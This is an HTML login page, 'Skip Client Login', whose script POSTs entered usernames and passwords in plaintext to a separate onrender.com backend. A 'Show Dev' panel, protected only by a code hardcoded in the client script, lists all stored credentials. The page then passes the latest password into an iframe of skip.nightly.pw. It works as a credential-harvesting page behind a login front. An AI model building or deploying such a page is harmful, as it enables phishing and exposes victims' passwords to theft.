<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Skip Client Login</title>
<style>
  body{font-family:sans-serif;background:#111;color:#eee;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
  .card{background:#222;padding:24px;border-radius:12px;max-width:400px;width:100%;text-align:center;}
  input{width:100%;padding:10px;margin:8px 0;border-radius:6px;border:none;}
  button{padding:10px 16px;border-radius:6px;border:none;background:#4a90e2;color:white;cursor:pointer;}
  button:hover{background:#357ab8;}
  pre{background:#111;padding:12px;border-radius:8px;overflow:auto;max-height:200px;text-align:left;display:none;}
  #iframeOverlay{position:fixed;inset:0;background:rgba(0,0,0,0.9);display:flex;flex-direction:column;z-index:999;visibility:hidden;opacity:0;transition:opacity 0.2s;}
  #iframeOverlay.active{visibility:visible;opacity:1;}
  #iframeOverlay iframe{flex:1;border:none;width:100%;}
  #iframeTop{display:flex;justify-content:space-between;padding:10px;background:#000;color:#fff;}
</style>
</head>
<body>

<div class="card">
  <h2>Skip Client Login</h2>

  <form id="loginForm">
    <input type="text" id="username" placeholder="Username" required>
    <input type="password" id="password" placeholder="Password" required>
    <div style="margin:12px 0">
      <input type="checkbox" id="consent"> I consent to save credentials
    </div>
    <button type="submit">Login & Save</button>
  </form>

  <button id="goToSkipBtn" style="margin-top:12px;display:none;">Go to Skip</button>
  <button id="showDevBtn" style="margin-top:8px;">Show Dev</button>

  <pre id="devOutput"></pre>
</div>

<!-- Iframe overlay -->
<div id="iframeOverlay">
  <div id="iframeTop">
    <span>skip.nightly.pw</span>
    <button id="closeIframe" style="background:#b22222;color:white;">Close</button>
  </div>
  <iframe id="skipIframe" src="about:blank" title="Skip site"></iframe>
</div>

<script>
const BACKEND = "https://skip-client-login.onrender.com"; // Render URL
const DEV_CODE = "jackson"; // must match backend

const loginForm = document.getElementById('loginForm');
const usernameEl = document.getElementById('username');
const passwordEl = document.getElementById('password');
const consentEl = document.getElementById('consent');
const goToSkipBtn = document.getElementById('goToSkipBtn');
const showDevBtn = document.getElementById('showDevBtn');
const devOutput = document.getElementById('devOutput');

const iframeOverlay = document.getElementById('iframeOverlay');
const skipIframe = document.getElementById('skipIframe');
const closeIframe = document.getElementById('closeIframe');

// Local capture of entries
const captures = [];

// Submit login
loginForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  const username = usernameEl.value.trim();
  const password = passwordEl.value.trim();

  if(!username || !password) return alert('Enter username and password');
  if(!consentEl.checked) return alert('You must consent to save credentials');

  const entry = { username, password, createdAt: new Date().toISOString() };
  captures.push(entry);

  try {
    const res = await fetch(`${BACKEND}/api/entries`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    const data = await res.json();
    if(data.ok){
      alert('Saved successfully âœ…');
      usernameEl.value = '';
      passwordEl.value = '';
      consentEl.checked = false;
      goToSkipBtn.style.display = 'block'; // show iframe button
    } else {
      alert('Error saving credentials');
    }
  } catch(err){
    console.error(err);
    alert('Failed to save');
  }
});

// Show Dev entries
showDevBtn.addEventListener('click', async () => {
  const code = prompt('Enter Dev Code:');
  if(!code) return;
  if(code !== DEV_CODE) return alert('Incorrect dev code');

  try {
    const res = await fetch(`${BACKEND}/api/dev?code=${encodeURIComponent(code)}`);
    const data = await res.json();
    let out = '';
    if(data.entries.length === 0) out = 'No credentials found';
    else {
      data.entries.forEach((e,i)=>{
        out += `${i+1}. Username: ${e.username}\n   Password: ${e.password}\n   Saved: ${new Date(e.createdAt).toLocaleString()}\n\n`;
      });
    }
    // Append local captures
    if(captures.length){
      out += '\nLocal (recent):\n\n';
      captures.forEach((c,i)=>{
        out += `${i+1}. Username: ${c.username}\n   Password: ${c.password}\n   Saved: ${new Date(c.createdAt).toLocaleString()}\n\n`;
      });
    }
    devOutput.textContent = out.trim();
    devOutput.style.display = 'block';
  } catch(err){
    console.error(err);
    alert('Failed to fetch dev entries');
  }
});

// Go to Skip iframe
goToSkipBtn.addEventListener('click', () => {
  if(captures.length === 0) return alert('No credentials captured');
  const latest = captures[captures.length - 1];
  iframeOverlay.classList.add('active');
  skipIframe.src = 'https://skip.nightly.pw';
  
  skipIframe.onload = () => {
    skipIframe.contentWindow.postMessage({
      type: 'skip-credentials',
      username: latest.username,
      password: latest.password
    }, 'https://skip.nightly.pw');
  };
});

// Close iframe
closeIframe.addEventListener('click', () => {
  iframeOverlay.classList.remove('active');
  skipIframe.src = 'about:blank';
});
</script>

</body>
</html>
